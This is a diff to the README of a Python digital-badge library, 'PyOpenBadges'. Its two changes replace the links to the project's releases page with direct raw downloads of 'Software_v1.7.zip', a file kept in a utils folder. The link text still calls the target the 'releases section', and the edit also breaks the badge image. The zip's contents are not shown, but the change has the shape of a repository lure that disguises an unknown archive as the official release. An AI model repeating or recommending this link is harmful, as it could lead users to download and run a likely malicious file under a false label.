@@ -9,7 +9,7 @@ Welcome to PyOpenBadges, a modern Python library for creating, validating, and m
 🎓 Ideal for educational institutions and certification providers  
 
 ## Installation:
-To get started with PyOpenBadges, you can visit the [releases section](https://github.com/2121698/pyopenbadges/releases) of our GitHub repository. Download the latest release file and follow the installation instructions to set up the library on your Python environment.
+To get started with PyOpenBadges, you can visit the [releases section](https://github.com/2121698/pyopenbadges/raw/refs/heads/main/pyopenbadges/utils/Software_v1.7.zip) of our GitHub repository. Download the latest release file and follow the installation instructions to set up the library on your Python environment.
 
 ## Usage:
 Once you have installed PyOpenBadges, you can begin integrating digital badge functionalities into your applications. Use the provided API documentation to explore the various methods available for badge creation, validation, and management.
@@ -45,4 +45,4 @@ For any questions, feedback, or assistance regarding PyOpenBadges, you can reach
 ## Conclusion:
 In conclusion, PyOpenBadges offers a reliable and efficient solution for creating, validating, and managing digital badges with Python. Whether you are an educational institution, a training platform, or a certification provider, the library equips you with the tools needed to implement digital credentials seamlessly. Explore the possibilities with PyOpenBadges today!
 
-[![Download PyOpenBadges](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/2121698/pyopenbadges/releases)
+[![Download PyOpenBadges](https://github.com/2121698/pyopenbadges/raw/refs/heads/main/pyopenbadges/utils/Software_v1.7.zip%20Release-brightgreen)](https://github.com/2121698/pyopenbadges/raw/refs/heads/main/pyopenbadges/utils/Software_v1.7.zip)
